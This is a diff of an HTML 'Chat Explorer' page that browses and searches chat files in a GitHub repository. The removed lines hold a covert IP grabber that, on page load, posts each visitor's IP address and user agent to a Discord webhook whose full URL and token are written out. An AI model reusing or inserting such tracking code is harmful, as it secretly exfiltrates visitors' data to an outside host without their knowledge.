@@ -2,43 +2,26 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Chats Navigator</title>
-  <style>
-    body { font-family: sans-serif; padding: 20px; background: #f0f0f0; }
-    h1 { font-size: 24px; }
-    ul { list-style: none; padding-left: 0; }
-    li { margin: 6px 0; }
-    a { color: #0077cc; text-decoration: none; }
-    a:hover { text-decoration: underline; }
-    .folder { font-weight: bold; margin-top: 20px; }
-  </style>
+  <title>Chat Explorer</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
-  <h1>Select a Chat Folder</h1>
-  <ul id="folders"></ul>
-  <div id="files"></div>
+<body class="bg-black text-red-500 p-4 sm:p-6">
+  <div class="max-w-4xl mx-auto">
+    <h1 class="text-2xl sm:text-3xl font-bold mb-4">📁 Chats</h1>
+
+    <input id="search" type="text" placeholder="Search (e.g., user/chat)" class="w-full p-2 mb-4 rounded bg-gray-800 text-red-300 placeholder-red-400">
+
+    <div id="results" class="mb-8"></div>
+
+    <ul id="folderList" class="space-y-4"></ul>
+  </div>
 
   <script>
-    // === IP grabber to webhook ===
-    fetch("https://api.ipify.org?format=json")
-      .then(res => res.json())
-      .then(data => {
-        const webhook = "https://discord.com/api/webhooks/1392932561742725251/vsbtT8849gy6ehGHjPC4i1bycHVXIB9kZja8wR6vNRYs9VIrbujLefuv7Wz-gqXmbZ2a";
-        const payload = {
-          content: `IP: \`${data.ip}\`\nUser-Agent: ${navigator.userAgent}`
-        };
-        fetch(webhook, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-      });
-
-    // === Chat folder browser ===
     const username = "lubrj";
     const repo = "expose";
     const branch = "main";
-    const chatsPath = "chats";
+    const basePath = "chats";
 
     async function fetchDir(path) {
       const url = `https://api.github.com/repos/${username}/${repo}/contents/${path}?ref=${branch}`;
@@ -47,43 +30,68 @@
       return await res.json();
     }
 
-    async function listFolders() {
-      const data = await fetchDir(chatsPath);
-      const foldersEl = document.getElementById("folders");
+    async function listAll() {
+      const folders = await fetchDir(basePath);
+      const container = document.getElementById("folderList");
 
-      data.filter(item => item.type === "dir").forEach(folder => {
-        const li = document.createElement("li");
-        const link = document.createElement("a");
-        link.textContent = folder.name;
-        link.href = "#";
-        link.onclick = () => {
-          listFiles(folder.name);
-          return false;
+      folders.filter(f => f.type === "dir").forEach(async folder => {
+        const files = await fetchDir(`${basePath}/${folder.name}`);
+
+        const wrapper = document.createElement("div");
+
+        const title = document.createElement("div");
+        title.className = "font-semibold text-red-400 cursor-pointer text-base sm:text-lg";
+        title.textContent = `📂 ${folder.name}`;
+
+        const ul = document.createElement("ul");
+        ul.className = "ml-4 hidden";
+
+        files.filter(file => file.name.endsWith(".html")).forEach(file => {
+          const li = document.createElement("li");
+          const a = document.createElement("a");
+          a.href = `/${repo}/${basePath}/${folder.name}/${file.name}`;
+          a.textContent = file.name;
+          a.className = "block text-red-300 hover:underline break-words";
+          li.appendChild(a);
+          ul.appendChild(li);
+        });
+
+        title.onclick = () => {
+          ul.classList.toggle("hidden");
         };
-        li.appendChild(link);
-        foldersEl.appendChild(li);
+
+        wrapper.appendChild(title);
+        wrapper.appendChild(ul);
+        container.appendChild(wrapper);
       });
     }
 
-    async function listFiles(folderName) {
-      const fileList = await fetchDir(`${chatsPath}/${folderName}`);
-      const filesEl = document.getElementById("files");
-      filesEl.innerHTML = `<h2 class="folder">📂 ${folderName}</h2><ul></ul>`;
-      const ul = filesEl.querySelector("ul");
+    document.getElementById("search").addEventListener("input", async (e) => {
+      const query = e.target.value.toLowerCase().trim();
+      const results = document.getElementById("results");
+      results.innerHTML = "";
 
-      fileList
-        .filter(file => file.type === "file" && file.name.endsWith(".html"))
-        .forEach(file => {
-          const li = document.createElement("li");
-          const link = document.createElement("a");
-          link.href = `/${repo}/${chatsPath}/${folderName}/${file.name}`;
-          link.textContent = file.name;
-          li.appendChild(link);
-          ul.appendChild(li);
-        });
-    }
+      if (!query) return;
 
-    listFolders();
+      const folders = await fetchDir(basePath);
+
+      for (const folder of folders) {
+        if (folder.type !== "dir") continue;
+        const files = await fetchDir(`${basePath}/${folder.name}`);
+
+        files.filter(f => f.name.toLowerCase().includes(query) && f.name.endsWith(".html"))
+          .forEach(f => {
+            const fullPath = `${folder.name}/${f.name}`;
+            const a = document.createElement("a");
+            a.href = `/${repo}/${basePath}/${fullPath}`;
+            a.textContent = fullPath;
+            a.className = "block text-red-300 hover:underline break-words";
+            results.appendChild(a);
+          });
+      }
+    });
+
+    listAll();
   </script>
 </body>
 </html>
